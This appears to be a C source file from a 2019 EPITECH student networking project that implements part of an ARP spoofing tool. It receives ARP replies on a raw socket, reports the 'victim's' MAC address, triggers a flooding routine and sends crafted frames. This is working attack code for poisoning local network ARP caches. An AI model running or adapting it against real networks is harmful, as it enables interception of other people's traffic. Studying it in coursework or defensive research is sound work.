/*
** EPITECH PROJECT, 2019
** NWP_my_arsp_2018
** File description:
** Communcation
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <time.h>
#include <linux/if_packet.h>
#include "myserver.h"

int is_for_me(const char *packet, arphdr_t arp, my_arsp_t *serv)
{
    arphdr_t myarp = (arphdr_t)(serv->buffer + sizeof(ethhdr));

    if (htons(arp->ar_op) != ARPOP_REPLY)
        return (1);
    for (int i = 0; i < 4; i++) {
        if (myarp->__ar_sip[i] != arp->__ar_tip[i]) {
            return (1);
        }
    }
    if (serv->printSpoof != NULL) {
        hexdup((uint8_t *)(packet), sizeof(my_arphdr_s) + sizeof(ethhdr));
        return (0);
    }
    serv->dest_mac = strdup((const char *)(arp->__ar_sha));
    if (serv->printSpoof == NULL) {
        printf("Found victim’s MAC address: '");
        print_mac(serv->dest_mac);
        printf("'\n");
        flood_it(serv);
    }
    return (0);
}

int recev_from_serv(my_arsp_t *serv)
{
    char buf[IP_MAXPACKET];

    memset(buf, 0, IP_MAXPACKET);
    if (recv(serv->raw_sock, buf, IP_MAXPACKET, 0) == -1) {
        perror("recv");
        return (1);
    }
    if (is_for_me(buf, ((arphdr_t)(buf + sizeof(ethhdr))), serv) == 0)
        return (0);
    return (1);
}

void send_package(my_arsp_t *serv)
{
    struct sockaddr_ll dest;

    memset((void*)&dest, 0, sizeof(struct sockaddr_ll));
    dest.sll_family = PF_PACKET;
    dest.sll_ifindex = if_nametoindex(serv->interface);
    dest.sll_halen = ETH_ALEN;
    memcpy((void*)(dest.sll_addr), (void*)serv->dest_ip, ETH_ALEN);
    if (sendto(serv->raw_sock, serv->buffer, serv->len_buffer, 0,
    (struct sockaddr*)&dest, sizeof(struct sockaddr_ll)) < 0) {
        perror("send");
        exit(84);
    }
}
